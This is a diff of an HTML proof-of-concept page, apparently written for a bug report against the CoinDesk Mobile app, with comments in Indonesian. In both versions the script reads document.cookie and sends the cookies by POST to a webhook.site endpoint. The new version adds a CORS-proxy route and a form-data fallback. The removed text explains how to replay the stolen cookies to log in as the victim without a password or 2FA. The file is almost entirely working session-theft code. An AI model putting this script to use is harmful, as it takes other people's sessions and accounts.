@@ -1,45 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head><title>CoinDesk ATO – Remote WebView Debugging</title></head>
-<body style="background:#000;color:#0f0;font-family:system-ui;text-align:center;padding:50px;">
-<h1>CRITICAL – Full Account Takeover</h1>
-<h2>CoinDesk Mobile v2.12.0</h2>
-<pre id="output" style="background:#111;padding:20px;margin:20px auto;max-width:90%;text-align:left;overflow:auto;"></pre>
+<head><title>CoinDesk ATO PoC – Fixed CORS</title></head>
+<body style="background:#000;color:#0f0;text-align:center;padding:50px;">
+<h1>CRITICAL PoC – Cookie Theft via Remote Debugging</h1>
+<pre id="output"></pre>
 
 <script>
-// Ambil SEMUA cookie (karena TIDAK HttpOnly!)
 const cookies = document.cookie;
+document.getElementById('output').textContent = `Cookie dicuri: ${cookies || '(kosong)'}`;
 
-// Kirim ke webhook kamu
+// Opsi 1: Via Proxy
+fetch('https://cors-anywhere.herokuapp.com/https://webhook.site/590ea786-c800-4823-b014-deec262c943e', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ cookies: cookies, proof: 'CoinDesk Mobile' })
+}).then(() => alert('Berhasil! Cek webhook.site'));
+
+// Opsi 2: Form Data Fallback
+const formData = new URLSearchParams({ cookies: cookies });
 fetch('https://webhook.site/590ea786-c800-4823-b014-deec262c943e', {
   method: 'POST',
   mode: 'no-cors',
-  body: JSON.stringify({
-    app: "CoinDesk Mobile v2.12.0",
-    url: location.href,
-    timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent,
-    cookies: cookies,
-    cookie_count: document.cookie.split(';').length,
-    proof: "Remote WebView Debugging → document.cookie accessible"
-  })
+  body: formData
 });
-
-// Tampilkan di halaman
-document.getElementById('output').textContent = `
-REMOTE WEBVIEW DEBUGGING ENABLED → FULL ACCOUNT TAKEOVER
-
-Cookie berhasil dicuri (tidak HttpOnly!):
-
-${cookies || '(cookie kosong di halaman ini)'}
-
-Total cookie: ${document.cookie.split(';').length}
-
-Gunakan cookie ini di browser biasa → kamu langsung login sebagai victim
-tanpa password, tanpa 2FA, tanpa phishing.
-
-PoC selesai.
-`;
 </script>
 </body>
 </html>
